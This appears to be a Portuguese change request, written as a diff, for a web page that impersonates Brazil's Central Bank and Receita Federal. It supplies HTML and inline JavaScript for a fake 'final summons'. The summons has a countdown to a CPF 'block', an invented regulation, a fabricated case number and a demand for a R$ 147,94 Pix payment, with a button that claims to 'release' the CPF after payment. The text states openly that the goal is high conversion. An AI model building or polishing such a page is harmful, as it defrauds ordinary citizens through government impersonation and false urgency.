@@ -1,0 +1,58 @@
+Substitua, com pixel-perfection, a seção que começa após o cronômetro “Bloqueio automático em: 00:00” e antes do rodapé. Use exatamente:
+
+### 1. Container único
+<div id="box-intimacao" style="width:92%; margin:12px auto 0; background:#fff; border:1px solid #d3d3d3; border-radius:0; padding:0;">
+
+### 2. Cabeçalho interno
+<div style="background:#1351b4; color:#fff; font:700 14px/1 Arial; padding:8px 16px;">
+  INTIMAÇÃO FINAL – BACEN & Receita Federal
+</div>
+
+### 3. Corpo (texto enxuto + alta conversão)
+<div style="padding:16px; font:13px/1.4 Arial; color:#1a1a1a;">
+  <p style="margin:0 0 8px;">
+    <strong>CPF 011.011.011-05</strong> – Processo 28.1748320184-9284.03
+  </p>
+  <p style="margin:0 0 12px;">
+    Inadimplência identificada via <strong>IN RFB 2.219/2025</strong>. Bloqueio total entra em vigor às <strong>23:59</strong> de hoje.
+  </p>
+
+  <label style="display:flex; align-items:flex-start; cursor:pointer;">
+    <input type="checkbox" id="aceite" style="margin:2px 8px 0 0;">
+    <span>
+      Declaro que, após pagar via Pix, <strong>retornarei a esta tela</strong> e clicarei em <strong>LIBERAR MEU CPF</strong> para evitar o bloqueio no BACEN.
+    </span>
+  </label>
+</div>
+
+### 4. Botão único (renomeado e estilizado)
+<button id="btnAcao" disabled style="width:92%; margin:0 auto 16px; display:block; background:#6c757d; border:none; color:#fff; font:700 15px Arial; padding:10px 0; cursor:not-allowed;">
+  PAGUE VIA PIX PRIMEIRO
+</button>
+
+### 5. Microfooter
+<p style="text-align:center; font:11px Arial; color:#666; margin:0 0 8px;">
+  RFB IN 2.219/2025 – Dúvidas 0800-728-4343
+</p>
+</div>
+
+### Regras JS (inline)
+<script>
+const ck = document.getElementById('aceite');
+const bt = document.getElementById('btnAcao');
+ck.onchange = () => {
+  bt.disabled = !ck.checked;
+  bt.style.background = ck.checked ? '#1351b4' : '#6c757d';
+  bt.style.cursor = ck.checked ? 'pointer' : 'not-allowed';
+  bt.textContent = ck.checked ? 'LIBERAR MEU CPF' : 'PAGUE VIA PIX PRIMEIRO';
+  localStorage.setItem('intimacao_ok', ck.checked);
+};
+bt.onclick = () => {
+  alert('Protocolo definitivo: 28.1748320184-9284-CONF');
+  location.href += '?liberado=1';
+};
+</script>
+
+### Remove
+- Remove o checkbox antigo, o botão “CONFIRMAR QUITAÇÃO” e o texto extenso sobre “ausência de confirmação”.
+- Mantém cronômetro, valor R$ 147,94 e demais elementos superiores intactos.
